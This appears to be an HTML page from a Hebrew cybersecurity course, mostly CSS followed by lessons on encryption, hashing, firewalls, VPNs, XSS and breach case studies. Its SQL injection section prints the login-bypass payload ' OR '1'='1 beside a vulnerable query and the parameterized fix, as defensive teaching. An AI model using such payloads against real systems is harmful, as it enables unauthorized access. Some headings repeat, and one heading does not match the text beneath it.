<!DOCTYPE html>
<html lang="he" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cybersecurity — אבטחת מידע</title><style>/* ============================================================
   SHARED DESIGN SYSTEM v3.0
   Clean, readable, mobile-first, bilingual
   ============================================================ */

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  /* Course accent — overridden per course */
  --accent:    #dc2626;
  --accent2:   #991b1b;
  --accentfg:  #ffffff;
  --accentbg:  rgba(220,38,38,.07);

  /* Base palette */
  --bg:        #ffffff;
  --bg2:       #f8f9fa;
  --bg3:       #f1f3f5;
  --border:    #e9ecef;
  --border2:   #ced4da;

  /* Text */
  --text:      #1a1a2e;
  --text2:     #4a4a6a;
  --text3:     #9a9ab0;

  /* Semantic */
  --green:     #16a34a;
  --green2:    #166534;
  --greenbg:   #f0fdf4;
  --red:       #dc2626;
  --redbg:     #fff1f2;
  --yellow:    #d97706;
  --yellowbg:  #fffbeb;

  /* Layout */
  --nav-h:     56px;
  --tabs-h:    48px;
  --max-w:     820px;
  --radius:    10px;
  --radius2:   16px;
  --radius3:   24px;

  /* Fonts */
  --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
  --mono: 'Courier New', Consolas, 'Liberation Mono', monospace;
  --shadow: 0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.05);
  --shadow2: 0 4px 16px rgba(0,0,0,.10);
}

html, body {
  font-family: var(--sans);
  background: var(--bg);
  color: var(--text);
  font-size: 15px;
  line-height: 1.65;
  -webkit-font-smoothing: antialiased;
  min-height: 100%;
}

/* ── HEADER ── */
.site-header {
  position: fixed; top: 0; left: 0; right: 0;
  height: var(--nav-h); z-index: 300;
  background: var(--bg);
  border-bottom: 1px solid var(--border);
  display: flex; align-items: center;
  padding: 0 20px; gap: 12px;
}
.site-logo {
  display: flex; align-items: center; gap: 8px;
  font-weight: 800; font-size: 15px; color: var(--accent);
  text-decoration: none; flex-shrink: 0;
  letter-spacing: -.02em;
}
.site-logo-mark {
  width: 30px; height: 30px; border-radius: 8px;
  background: var(--accent); color: var(--accentfg);
  display: flex; align-items: center; justify-content: center;
  font-family: var(--mono); font-size: 13px; font-weight: 900;
}
.site-chapter-name {
  flex: 1; min-width: 0;
  font-size: 13px; color: var(--text3); font-weight: 500;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.lang-btn {
  flex-shrink: 0; padding: 5px 14px;
  background: var(--bg2); border: 1px solid var(--border2);
  border-radius: var(--radius); font-size: 12px; font-weight: 700;
  color: var(--text2); cursor: pointer; transition: all .15s;
  letter-spacing: .02em;
}
.lang-btn:hover { background: var(--accent); color: var(--accentfg); border-color: var(--accent); }

/* ── CHAPTER NAV ── */
.ch-nav {
  position: fixed; top: var(--nav-h); left: 0; right: 0;
  height: var(--tabs-h); z-index: 200;
  background: var(--bg); border-bottom: 1px solid var(--border);
  display: flex; align-items: center;
  padding: 0 12px; gap: 4px;
  overflow-x: auto; overflow-y: hidden;
  scrollbar-width: none;
}
.ch-nav::-webkit-scrollbar { display: none; }
.ch-btn {
  flex-shrink: 0; display: flex; flex-direction: column;
  align-items: center; gap: 1px;
  padding: 6px 12px; border: none; background: none;
  cursor: pointer; border-radius: var(--radius);
  color: var(--text3); transition: all .15s;
  min-width: 44px;
}
.ch-btn:hover { background: var(--bg2); color: var(--text); }
.ch-btn.active { background: var(--accentbg); color: var(--accent); }
.ch-btn.active .ch-num { color: var(--accent); font-weight: 800; }
.ch-num {
  font-family: var(--mono); font-size: 11px;
  font-weight: 600; color: var(--text3);
}
.ch-title-text {
  font-size: 9px; font-weight: 600;
  max-width: 64px; text-align: center; line-height: 1.2;
  overflow: hidden; display: -webkit-box;
  -webkit-line-clamp: 2; -webkit-box-orient: vertical;
}
.ch-stars { font-size: 8px; min-height: 10px; }

/* ── MAIN LAYOUT ── */
.main {
  padding-top: calc(var(--nav-h) + var(--tabs-h) + 24px);
  padding-bottom: 80px;
  max-width: var(--max-w);
  margin: 0 auto;
  padding-left: 20px;
  padding-right: 20px;
}

/* ── CHAPTER ── */
.chapter { display: none; }
.chapter.active { display: block; }

/* ── CHAPTER HERO ── */
.ch-hero {
  padding-bottom: 24px;
  border-bottom: 1px solid var(--border);
  margin-bottom: 32px;
}
.ch-tag {
  display: inline-block; font-size: 10px; font-weight: 700;
  color: var(--accent); background: var(--accentbg);
  padding: 3px 10px; border-radius: 20px; margin-bottom: 10px;
  letter-spacing: .08em; text-transform: uppercase;
  font-family: var(--mono);
}
.ch-title {
  font-size: 26px; font-weight: 900; color: var(--text);
  line-height: 1.2; letter-spacing: -.02em; margin-bottom: 8px;
}
.ch-desc {
  font-size: 14px; color: var(--text3); margin-bottom: 20px;
  max-width: 560px; line-height: 1.5;
}

/* ── TAB BAR ── */
.tabs-bar { display: flex; gap: 6px; flex-wrap: wrap; }
.tab-btn {
  padding: 6px 16px; font-size: 13px; font-weight: 600;
  color: var(--text3); background: var(--bg2);
  border: 1px solid var(--border); border-radius: var(--radius);
  cursor: pointer; transition: all .15s;
}
.tab-btn:hover { color: var(--text2); border-color: var(--border2); }
.tab-btn.active {
  background: var(--accent); color: var(--accentfg);
  border-color: var(--accent);
}

/* ── TAB PANELS ── */
.tab-panel { display: none; }
.tab-panel.active { display: block; }

/* ── LEARN CONTENT ── */
.did-you-know {
  background: var(--yellowbg); border: 1px solid #fde68a;
  border-left: 4px solid var(--yellow);
  padding: 14px 16px; border-radius: 0 var(--radius) var(--radius) 0;
  font-size: 14px; color: #713f12; line-height: 1.6; margin-bottom: 28px;
}
[dir="ltr"] .did-you-know { border-left: 4px solid var(--yellow); border-right: none; }
[dir="rtl"] .did-you-know { border-right: 4px solid var(--yellow); border-left: none; }

.section-title {
  font-size: 17px; font-weight: 800; color: var(--text);
  margin: 30px 0 10px; letter-spacing: -.01em;
}

.prose {
  font-size: 15px; color: var(--text2); line-height: 1.8;
  margin-bottom: 14px; max-width: 680px;
}
.prose em { color: var(--accent); font-style: normal; font-weight: 600; }

code, .inline-code {
  font-family: var(--mono); font-size: 12.5px;
  background: var(--bg3); padding: 2px 5px;
  border-radius: 4px; color: var(--accent2); font-weight: 600;
}

/* ── CODE BLOCKS ── */
.code-block, pre.code-block {
  background: #0d1117; border-radius: var(--radius2);
  padding: 18px 20px; margin: 14px 0 22px;
  overflow-x: auto; border: 1px solid #30363d;
}
.code-block code {
  font-family: var(--mono); font-size: 12.5px;
  line-height: 1.75; color: #c9d1d9;
  background: none; padding: 0; display: block;
  white-space: pre; font-weight: normal;
}
.comment { color: #8b949e; }
.key     { color: #79c0ff; }
.str     { color: #a5d6ff; }
.val     { color: #ffa657; }

/* ── CARDS ── */
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 14px 0 22px; }
.grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin: 14px 0 22px; }
.card {
  background: var(--bg); border: 1px solid var(--border);
  border-radius: var(--radius2); padding: 18px;
  display: flex; flex-direction: column; gap: 6px;
  box-shadow: var(--shadow); transition: box-shadow .15s, transform .15s;
}
.card:hover { box-shadow: var(--shadow2); transform: translateY(-1px); }
.card-icon { font-size: 24px; }
.card-title { font-size: 13px; font-weight: 800; color: var(--text); }
.card-body { font-size: 13px; color: var(--text2); line-height: 1.55; }

/* ── TABLES ── */
.table-wrap {
  overflow-x: auto; margin: 14px 0 22px;
  border-radius: var(--radius2); border: 1px solid var(--border);
  box-shadow: var(--shadow);
}
.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.data-table thead { background: var(--bg2); }
.data-table th {
  padding: 10px 14px; text-align: start; font-weight: 700;
  color: var(--text2); font-size: 11px;
  text-transform: uppercase; letter-spacing: .06em;
  border-bottom: 1px solid var(--border);
}
.data-table td {
  padding: 10px 14px; color: var(--text2);
  border-bottom: 1px solid var(--border);
  vertical-align: top; line-height: 1.5;
}
.data-table tr:last-child td { border-bottom: none; }
.data-table tr:hover td { background: var(--bg2); }

/* ── CALLOUTS ── */
.callout {
  padding: 12px 16px; border-radius: var(--radius);
  font-size: 14px; line-height: 1.6; margin: 14px 0 20px;
  border: 1px solid; border-left-width: 4px;
}
[dir="rtl"] .callout { border-left-width: 1px; border-right-width: 4px; }
.callout-info    { background: #eff6ff; border-color: #bfdbfe; color: #1e40af; }
.callout-warn    { background: var(--yellowbg); border-color: #fde68a; color: #92400e; }
.callout-tip     { background: var(--greenbg); border-color: #bbf7d0; color: #166534; }
.callout-success { background: var(--bg2); border-color: var(--border); color: var(--text2); }

/* ── REAL WORLD BOX ── */
.real-world-box {
  background: var(--bg); border: 1px solid var(--border);
  border-radius: var(--radius2); padding: 18px 20px; margin: 20px 0;
  box-shadow: var(--shadow); position: relative;
  overflow: hidden;
}
.real-world-box::before {
  content: ''; position: absolute; top: 0; left: 0;
  width: 3px; height: 100%; background: var(--accent);
}
[dir="rtl"] .real-world-box::before { left: auto; right: 0; }
.real-world-title { font-size: 13px; font-weight: 800; color: var(--accent); margin-bottom: 8px; }
.real-world-body { font-size: 13.5px; color: var(--text2); line-height: 1.7; }
.real-world-body code { font-size: 12px; }

/* ── END OF CHAPTER NAV ── */
.ch-end-nav, .ch-end-nav-en {
  display: flex; gap: 10px; justify-content: center;
  flex-wrap: wrap; margin-top: 36px; padding-top: 28px;
  border-top: 1px solid var(--border);
}
.ch-end-btn {
  display: flex; flex-direction: column; align-items: center; gap: 5px;
  padding: 14px 22px; border-radius: var(--radius2);
  border: 1px solid var(--border); background: var(--bg2);
  color: var(--text2); cursor: pointer; font-weight: 700;
  font-size: 13px; transition: all .15s; min-width: 120px;
  font-family: var(--sans);
}
.ch-end-btn:hover { border-color: var(--accent); color: var(--accent); background: var(--accentbg); }
.ch-end-btn.primary {
  background: var(--green); color: #fff; border-color: var(--green2);
}
.ch-end-btn.primary:hover { background: var(--green2); }
.ch-end-btn-icon { font-size: 20px; }
.ch-end-btn-label { font-size: 11px; text-transform: uppercase; letter-spacing: .04em; }

/* ── GAME ── */
.game-start-card {
  max-width: 400px; margin: 0 auto;
  text-align: center; padding: 40px 20px;
}
.game-start-icon {
  font-size: 52px; margin-bottom: 12px;
  font-family: var(--mono); color: var(--accent);
  line-height: 1;
}
.game-start-title { font-size: 22px; font-weight: 900; color: var(--text); margin-bottom: 8px; }
.game-start-desc  { font-size: 14px; color: var(--text3); margin-bottom: 20px; }
.game-rules { display: flex; justify-content: center; gap: 16px; margin-bottom: 24px; flex-wrap: wrap; }
.game-rule {
  font-size: 13px; font-weight: 600; color: var(--text2);
  background: var(--bg2); padding: 6px 14px;
  border-radius: var(--radius); border: 1px solid var(--border);
}
.btn-start {
  background: var(--accent); color: var(--accentfg);
  border: none; padding: 12px 32px; border-radius: var(--radius2);
  font-size: 15px; font-weight: 800; cursor: pointer;
  transition: all .15s; font-family: var(--sans);
  letter-spacing: .02em;
}
.btn-start:hover { opacity: .9; transform: translateY(-1px); }

.game-hud {
  display: flex; justify-content: space-between; align-items: center;
  margin-bottom: 16px; padding: 10px 16px;
  background: var(--bg2); border-radius: var(--radius);
  border: 1px solid var(--border);
}
.hud-timer { font-family: var(--mono); font-size: 18px; font-weight: 800; color: var(--text); }
.hud-timer.urgent { color: var(--red); }
.hud-qnum  { font-size: 13px; color: var(--text3); font-weight: 600; }
.hud-score { font-size: 15px; font-weight: 800; color: var(--accent); }

.game-question { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 18px; line-height: 1.4; }

.game-opts { display: flex; flex-direction: column; gap: 10px; }
.game-opt {
  display: flex; align-items: center; gap: 12px;
  padding: 13px 16px; border-radius: var(--radius);
  border: 1px solid var(--border); background: var(--bg);
  cursor: pointer; font-size: 14px; color: var(--text2);
  font-weight: 500; transition: all .12s; text-align: start;
  font-family: var(--sans); line-height: 1.4;
}
.game-opt:hover { border-color: var(--accent); color: var(--text); }
.game-opt.correct { border-color: var(--green); background: var(--greenbg); color: var(--green2); }
.game-opt.wrong   { border-color: var(--red);   background: var(--redbg);   color: var(--red); }

.opt-letter {
  width: 26px; height: 26px; border-radius: 6px;
  background: var(--bg3); display: flex; align-items: center;
  justify-content: center; font-size: 11px; font-weight: 800;
  flex-shrink: 0; color: var(--text3); font-family: var(--mono);
  transition: all .12s;
}
.game-opt:hover .opt-letter { background: var(--accentbg); color: var(--accent); }
.game-opt.correct .opt-letter { background: var(--green); color: #fff; }
.game-opt.wrong   .opt-letter { background: var(--red);   color: #fff; }

.game-feedback { min-height: 28px; margin-top: 12px; text-align: center; font-size: 14px; font-weight: 700; }
.fb-correct { color: var(--green); }
.fb-wrong   { color: var(--red); }

.game-over-card, .game-empty {
  max-width: 380px; margin: 30px auto; text-align: center; padding: 32px 20px;
}
.game-empty { color: var(--text3); font-size: 14px; }
.game-over-medal { font-size: 52px; margin-bottom: 8px; }
.game-over-score { font-size: 48px; font-weight: 900; color: var(--accent); font-family: var(--mono); line-height: 1; }
.game-over-pct   { font-size: 14px; color: var(--text3); margin: 4px 0; }
.game-over-label { font-size: 18px; font-weight: 800; color: var(--text); margin-bottom: 20px; }
.game-over-btns  { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }

/* ── QUIZ ── */
.quiz-pips { display: flex; gap: 4px; margin-bottom: 20px; }
.qpip { flex: 1; height: 4px; border-radius: 2px; background: var(--border2); transition: background .2s; }
.qpip.done { background: var(--accent); }
.qpip.cur  { background: var(--accent); opacity: .5; }
.quiz-card { display: none; }
.quiz-card.active { display: block; }
.quiz-meta { font-size: 11px; font-weight: 700; color: var(--text3); text-transform: uppercase; letter-spacing: .06em; margin-bottom: 8px; }
.quiz-q { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 18px; line-height: 1.4; }
.quiz-opts { display: flex; flex-direction: column; gap: 10px; margin-bottom: 14px; }
.quiz-opt {
  display: flex; align-items: center; gap: 12px;
  padding: 12px 16px; border-radius: var(--radius);
  border: 1px solid var(--border); background: var(--bg);
  cursor: pointer; font-size: 14px; color: var(--text2);
  font-weight: 500; transition: all .12s; text-align: start;
  font-family: var(--sans); line-height: 1.4;
}
.quiz-opt:hover:not(:disabled) { border-color: var(--accent); }
.quiz-opt.correct { border-color: var(--green); background: var(--greenbg); }
.quiz-opt.wrong   { border-color: var(--red);   background: var(--redbg); }
.quiz-opt:disabled { cursor: default; }
.quiz-explain {
  padding: 12px 14px; background: var(--greenbg);
  border: 1px solid #bbf7d0; border-radius: var(--radius);
  font-size: 13.5px; color: #166534; line-height: 1.6; margin-top: 12px;
}
.quiz-result { text-align: center; padding: 28px 0; }
.quiz-nav { display: flex; justify-content: space-between; margin-top: 16px; gap: 10px; }

/* ── SUMMARY ── */
.cheat-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(200px,1fr)); gap: 12px; margin-top: 8px; }
.cheat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius2); padding: 14px; }
.cheat-item { display: flex; justify-content: space-between; gap: 8px; padding: 5px 0; border-bottom: 1px solid var(--border); font-size: 12.5px; }
.cheat-item:last-child { border-bottom: none; }
.cheat-key { font-family: var(--mono); color: var(--accent); font-weight: 700; font-size: 11.5px; flex-shrink: 0; }
.cheat-val { color: var(--text3); text-align: end; font-size: 11.5px; }

/* ── SHARED BUTTONS ── */
.nav-btn {
  padding: 9px 20px; border-radius: var(--radius);
  font-size: 13px; font-weight: 700; cursor: pointer;
  transition: all .15s; font-family: var(--sans); border: 1px solid;
}
.nav-btn.primary {
  background: var(--accent); color: var(--accentfg); border-color: var(--accent);
}
.nav-btn.primary:hover { background: var(--accent2); border-color: var(--accent2); }
.nav-btn.ghost {
  background: var(--bg2); color: var(--text2); border-color: var(--border2);
}
.nav-btn.ghost:hover { background: var(--bg3); color: var(--text); }
.nav-btn:disabled { opacity: .4; cursor: default; }

/* ── CREDITS ── */
.credits-bar { border-top: 1px solid var(--border); padding: 28px 0; margin-top: 48px; }
.credits-title { font-size: 10px; font-weight: 800; color: var(--accent); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 14px; font-family: var(--mono); }
.credits-grid { display: flex; flex-wrap: wrap; gap: 24px; }
.credit-group { flex: 1; min-width: 130px; }
.credit-group-title { font-size: 11px; font-weight: 700; color: var(--text2); margin-bottom: 6px; text-transform: uppercase; letter-spacing: .05em; }
.credit-item { font-size: 12px; color: var(--text3); line-height: 1.9; }
.credit-item a { color: var(--accent); text-decoration: none; font-weight: 600; }
.credit-item a:hover { text-decoration: underline; }

/* ── MOBILE ── */
@media (max-width: 680px) {
  :root { --nav-h: 52px; --tabs-h: 44px; }
  .main { padding-left: 16px; padding-right: 16px; }
  .ch-title { font-size: 21px; }
  .grid-2, .grid-3 { grid-template-columns: 1fr; }
  .ch-btn { padding: 6px 9px; min-width: 38px; }
  .ch-title-text { font-size: 8px; max-width: 52px; }
  .game-rules { gap: 8px; }
  .ch-end-nav, .ch-end-nav-en { gap: 8px; }
  .ch-end-btn { min-width: 100px; padding: 12px 14px; }
  .game-over-btns, .quiz-nav { flex-wrap: wrap; }
  .real-world-box { padding: 14px 16px; }
}
@media (max-width: 400px) {
  .ch-title-text { display: none; }
  .ch-btn { min-width: 32px; }
}

/* ── RICH CHEAT SHEETS ── */
.cheat-section-title {
  font-size: 12px; font-weight: 800; color: var(--accent);
  text-transform: uppercase; letter-spacing: .08em;
  margin: 18px 0 8px; font-family: var(--mono);
}
.cheat-section-title:first-child { margin-top: 0; }
.cheat-table { display: flex; flex-direction: column; gap: 0; margin-bottom: 6px; }
.cheat-row {
  display: flex; gap: 12px; padding: 6px 0;
  border-bottom: 1px solid var(--border); align-items: baseline;
}
.cheat-row:last-child { border-bottom: none; }
.cheat-k {
  font-family: var(--mono); font-size: 12px; font-weight: 700;
  color: var(--accent); flex-shrink: 0; min-width: 160px;
  line-height: 1.4;
}
.cheat-v {
  font-size: 13px; color: var(--text2); line-height: 1.4;
  flex: 1;
}
.cheat-tip {
  margin-top: 14px; padding: 10px 14px;
  background: var(--yellowbg); border-radius: var(--radius);
  border: 1px solid #fde68a; font-size: 13px; color: #713f12;
  line-height: 1.6;
}
.cheat-tip code {
  background: rgba(0,0,0,.08); padding: 1px 4px;
  border-radius: 3px; font-size: 11.5px;
}
@media (max-width: 500px) {
  .cheat-row { flex-direction: column; gap: 2px; }
  .cheat-k { min-width: unset; }
}

<div class="section-title">CIA Triad — שלוש עמודות האבטחה</div>
<p class="prose">כל מערכת אבטחה בעולם, ממנעול דלת ועד מערכת בנקאית, נשפטת לפי שלושה קריטריונים בסיסיים. הם נקראים CIA Triad — לא הסוכנות האמריקאית, אלא ראשי תיבות של שלושה עקרונות שמגדירים מה זה "בטוח".</p>

<p class="prose">הצפנה סימטרית היא הסוג הפשוט ביותר: אותו מפתח מצפין ומפענח. אם שלחת לחברה מכתב מקודד בשיטה שסיכמתם מראש, שניכם משתמשים באותה שיטה. זה מהיר ויעיל, אבל יש בעיה אחת גדולה: איך מעבירים את המפתח בבטחה בפעם הראשונה?</p>
<div class="grid-2">
<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES — תקן ההצפנה העולמי</div><div class="card-body">AES-256 הוא ה-standard של הממשלה האמריקאית ורוב העולם. פריצה בכוח גס תדרוש יותר זמן מגיל היקום. מה שבנק, VPN, ו-WhatsApp משתמשים בו.</div></div>
<div class="card"><div class="card-icon">⚡</div><div class="card-title">למה סימטרית מהירה?</div><div class="card-body">הצפנה סימטרית מהירה פי 1000+ מאסימטרית. לכן ב-HTTPS: הצפנה אסימטרית רק להחלפת המפתח, ואחרי כן הכל בAES מהיר.</div></div>
</div>

<div class="section-title">Asymmetric Encryption — פתרון בעיית ההפצה</div>
<p class="prose">הצפנה אסימטרית פותרת את הבעיה של "איך מעבירים מפתח בבטחה" בדרך גאונית: לכל צד יש שני מפתחות. מפתח ציבורי שאפשר לפרסם לכולם, ומפתח פרטי שנשמר בסוד. מה שמוצפן במפתח הציבורי — רק המפתח הפרטי יכול לפתוח. כך אפשר לקבל הודעות מוצפנות מכולם מבלי להעביר סודות מראש.</p>
<pre class="code-block"><code><span class="comment"># HTTPS Handshake — כיצד האינטרנט מוצפן</span>
1. דפדפן ← שרת: "שלח לי את המפתח הציבורי שלך"
2. שרת ← דפדפן: 📜 Certificate + Public Key
3. דפדפן: מאמת Certificate, מייצר Session Key
4. דפדפן ← שרת: Session Key מוצפן ב-Public Key
5. שרת: מפענח עם Private Key
6. ← הכל מוצפן עם Session Key ←
<span class="comment"># מכאן: AES מהיר עם Session Key שניהם יודעים</span></code></pre>

<div class="section-title">Hashing — טביעת אצבע חד-כיוונית</div>
<p class="prose">Hash function לוקחת כל קלט ומייצרת "טביעת אצבע" — מחרוזת קצרה וקבועה שמייצגת אותו. שינוי תו אחד משנה לחלוטין את ה-hash. וחשוב מכל: לא ניתן להחזיר את המידע המקורי מה-hash. לכן סיסמאות מאוחסנות כhash — גם אם מסד הנתונים נגנב, הסיסמאות האמיתיות לא חשופות.</p>
<pre class="code-block"><code><span class="comment"># Hashing בפועל</span>
SHA-256(<span class="str">"password123"</span>) = ef92b778bafe771...
SHA-256(<span class="str">"password124"</span>) = d7a1e7b4b3c9f2...
<span class="comment"># שינוי תו אחד ← hash שונה לחלוטין ← Avalanche Effect</span>

<span class="comment"># bcrypt לסיסמאות — מכוון להיות איטי!</span>
bcrypt(<span class="str">"mypassword"</span>, rounds=12) → <span class="val">$2b$12$...</span>
<span class="comment"># איטי בכוונה: brute force עולה שנים, לא שניות</span></code></pre>

<div class="real-world-box">
  <div class="real-world-title">🌍 Case Study: SolarWinds — מתקפת שרשרת האספקה</div>
  <div class="real-world-body">
    ב-2020 גילתה FireEye מתקפה שהחלה 9 חודשים קודם לכן: האקרים (המיוחסים לרוסיה) חדרו לתוכנת ניהול רשת SolarWinds Orion, הכניסו קוד זדוני לתוך ה-update הרשמי, ו-18,000 ארגון — כולל משרדי ממשלה אמריקאים — התקינו את ה-update הנגוע.<br><br>
    הקוד חיכה 2 שבועות לפני הפעלה, כדי לא להיתפס. הנתונים שנגנבו כללו מיילים ממשרדי ממשלה, חברות נשק, ותשתיות קריטיות. <strong>הלקח: Code signing — חתימה דיגיטלית על כל עדכון תוכנה — היה מונע את ההפצה.</strong>
  </div>
</div>

<div class="section-title">Firewalls — שומרי הכניסה לרשת</div>
<p class="prose">Firewall הוא שומר שבודק כל packet של מידע שנכנס ויוצא מהרשת. הוא פועל לפי כללים: "תנועה מ-IP זה — חסום. תנועה לPort 443 — אפשר. כל השאר — חסום." ה-Firewall לא רואה את תוכן ההצפנה, אבל הוא רואה: מאיפה, לאן, ובאיזה שפה.</p>
<div class="grid-2">
<div class="card"><div class="card-icon">🧱</div><div class="card-title">Stateless Firewall</div><div class="card-body">בודק כל packet בנפרד לפי כללים קבועים. מהיר אבל עיוור להקשר. לא יודע אם ה-packet הוא חלק משיחה לגיטימית או ניסיון פריצה.</div></div>
<div class="card"><div class="card-icon">🔍</div><div class="card-title">Stateful / NGFW</div><div class="card-body">מעקב אחרי שיחות שלמות. Next-Gen Firewalls גם מנתחים תוכן, מזהים אפליקציות, ומשלבים Intrusion Detection. הסטנדרט כיום.</div></div>
</div>

<div class="section-title">Zero Trust — "לעולם אל תסמוך, תמיד תאמת"</div>
<p class="prose">המודל הישן של אבטחת רשת אמר: מי שנמצא בתוך הרשת — בטוח. מי שבחוץ — לא. Zero Trust הופך את זה לגמרי: אף אחד לא מהימן מראש, בין שהוא בתוך הרשת ובין שבחוץ. כל בקשה צריכה להוכיח את עצמה מחדש — זהות, מכשיר, הקשר — בכל פעם.</p>
<p class="prose">הסיבה למעבר: תוקפים כבר מזמן למדו להיכנס לרשת הפנימית דרך phishing, VPN גנוב, או מכשיר עובד שנפגע. ברגע שהם בפנים — עם מודל הישן הם יכולים לנוע חופשית. Zero Trust מחייב אותם להוכיח זהות בכל צעד.</p>

<div class="section-title">VPN, TLS, ו-HTTPS — ההצפנה בשכבות</div>
<pre class="code-block"><code><span class="comment"># מה הן שכבות הגנת הרשת בפועל</span>
HTTPS = HTTP + TLS
<span class="comment"># TLS: מוצפן בין דפדפן לשרת. ISP רואה לאיזה domain, לא מה</span>

VPN = Encrypted tunnel לשרת ביניים
<span class="comment"># כל ה-traffic עובר מוצפן לVPN server</span>
<span class="comment"># ISP רואה: VPN traffic. לא לאן ולא מה.</span>

DNS over HTTPS (DoH)
<span class="comment"># גם שאילתות DNS מוצפנות. ISP לא רואה אפילו domain names</span></code></pre>

<div class="real-world-box">
  <div class="real-world-title">🌍 Case Study: WannaCry — כשרשת שלמה נפלה ב-74 דקות</div>
  <div class="real-world-body">
    במאי 2017 תקפה WannaCry 200,000+ מחשבים ב-150 מדינות תוך יום אחד. NHS (מערכת הבריאות הבריטית) נפלה — ניתוחים בוטלו, מחשבי חדרי מיון הפסיקו לעבוד. FedEx, Telefonica, Renault — כולם נפגעו.<br><br>
    הפרצה: EternalBlue — exploit ב-SMB פרוטוקול של Windows שה-NSA פיתח ולא גילה למיקרוסופט. הוא דלף ופורסם חודשיים קודם. מיקרוסופט הוציאה patch — אבל NHS לא עדכן. <strong>הלקח: עדכוני אבטחה הם לא "nice to have". הם קו ההגנה הראשון והזול ביותר.</strong>
  </div>
</div>
<div class="section-title">Stateful vs Stateless Firewall</div>
<p class="prose">Stateless firewall בודק כל packet בנפרד — כמו שומר שבודק כל אדם לפי החולצה שלו בלי לזכור מי נכנס לפני שנייה. Stateful firewall זוכר את מצב ה-connection: הוא יודע שה-packet הזה הוא חלק מ-TCP session שנפתח כחוק, ולא ניסיון חדירה. כמעט כל firewall מודרני הוא stateful.</p>
<p class="prose">Next-Generation Firewall (NGFW) מוסיף שכבות: Deep Packet Inspection שקורא את תוכן ה-traffic (לא רק headers), Application Awareness שמזהה Netflix לעומת SSH לעומת BitTorrent — ומאפשר לחסום לפי אפליקציה ולא רק לפי port. IDS (Intrusion Detection System) מזהה ומתריע. IPS (Intrusion Prevention System) גם חוסם בזמן אמת.</p>
<div class="section-title">VPN — מה הוא עושה ומה לא</div>
<p class="prose">VPN יוצר "מנהרה" מוצפנת בין המכשיר שלך לשרת VPN. כל ה-traffic עובר דרכה — אתר היעד רואה את ה-IP של שרת ה-VPN, לא שלך. VPN מגן על: traffic ב-WiFi ציבורי, מידע עסקי בגישה מרחוק, עקיפת חסימות גיאוגרפיות. VPN לא מגן על: malware שכבר מותקן, phishing שלחצת עליו, credentials שגנבו ממך.</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>כלי</th><th>מה מגן</th><th>מה לא מגן</th></tr></thead><tbody>
<tr><td>Firewall</td><td>גישה לא מורשית לרשת</td><td>malware שכבר בפנים</td></tr>
<tr><td>VPN</td><td>traffic ברשת ציבורית</td><td>phishing, malware, credentials</td></tr>
<tr><td>IDS/IPS</td><td>patterns של תקיפות ידועות</td><td>zero-days, insider threats</td></tr>
<tr><td>DMZ</td><td>פנים הרשת מ-servers חיצוניים</td><td>תקיפות על ה-servers עצמם</td></tr>
</tbody></table></div>
<div class="real-world-box"><div class="real-world-title">🌍 הפרצה של Target (2013) — Firewall לא מספיק</div>
<div class="real-world-body">Target, רשת קמעונאות אמריקאית, נפרצה דרך ספק מיזוג אוויר שהיה מחובר לרשת שלה. ה-firewall אישר את החיבור — הספק היה לגיטימי. אבל ברגע שהתוקפים השיגו גישה דרך הספק, הם זזו laterally ברחבי הרשת. 40 מיליון כרטיסי אשראי נגנבו. הלקח: Network Segmentation ו-Least Privilege — אפילו ספק לגיטימי לא אמור להגיע ל-POS systems.</div></div>

<div class="section-title">SQL Injection — כשהקלט הופך לפקודה</div>
<p class="prose">SQL Injection קורה כשמשתמש מזין קוד SQL במקום נתונים רגילים, ואפליקציה שלא מוגנת מריצה אותו. נניח שאתר בונה שאילתה כזו: <code>SELECT * FROM users WHERE username='[input]'</code>. אם המשתמש מזין <code>' OR '1'='1</code> — השאילתה הופכת ל-<code>WHERE username='' OR '1'='1'</code>, שמחזיר את כל המשתמשים. ניתן כך לעקוף סיסמאות, לגנוב מסדי נתונים שלמים, ולמחוק טבלאות.</p>
<pre class="code-block"><code><span class="comment"># ❌ קוד פגיע — מחרוזת ישירה</span>
query = <span class="str">"SELECT * FROM users WHERE name='"</span> + user_input + <span class="str">"'"</span>

<span class="comment"># ✅ Parameterized Query — הפתרון</span>
cursor.execute(<span class="str">"SELECT * FROM users WHERE name=?"</span>, (user_input,))
<span class="comment"># DB מטפל בהרצת הפרמטר נפרד מה-SQL — injection בלתי אפשרי</span></code></pre>

<div class="section-title">XSS — Cross-Site Scripting</div>
<p class="prose">XSS קורה כשתוקף מצליח להזריק JavaScript לאתר שנטען אצל הקורבן. הדפדפן של הקורבן מריץ את הקוד כאילו הוא חלק לגיטימי מהאתר — ולכן הקוד יכול לגנוב cookies, לשנות את תוכן הדף, לשלוח מידע לשרת של התוקף. ה-harm: גניבת session cookies = גניבת זהות המשתמש ללא צורך בסיסמה.</p>

<div class="real-world-box">
  <div class="real-world-title">🌍 Case Study: Equifax 2017 — 147 מיליון רשומות אישיות</div>
  <div class="real-world-body">
    ב-2017 נגנבו מ-Equifax נתוני אשראי של 147 מיליון אמריקאים — שמות, תאריכי לידה, מספרי ביטוח לאומי, כרטיסי אשראי. הפרצה נמשכה 76 ימים לפני גילוי.<br><br>
    הסיבה: Apache Struts עם פגיעות ידועה שלא עודכנה. ה-patch היה זמין חודשיים קודם לכן. Equifax שילמה $575 מיליון פשרה עם FTC. <strong>הלקח: patch management — עדכון שוטף של libraries ותלויות — הוא לא אופציונלי. זה הבסיס.</strong>
  </div>
</div>
<div class="section-title">SQL Injection — מה שכולם צריכים להבין</div>
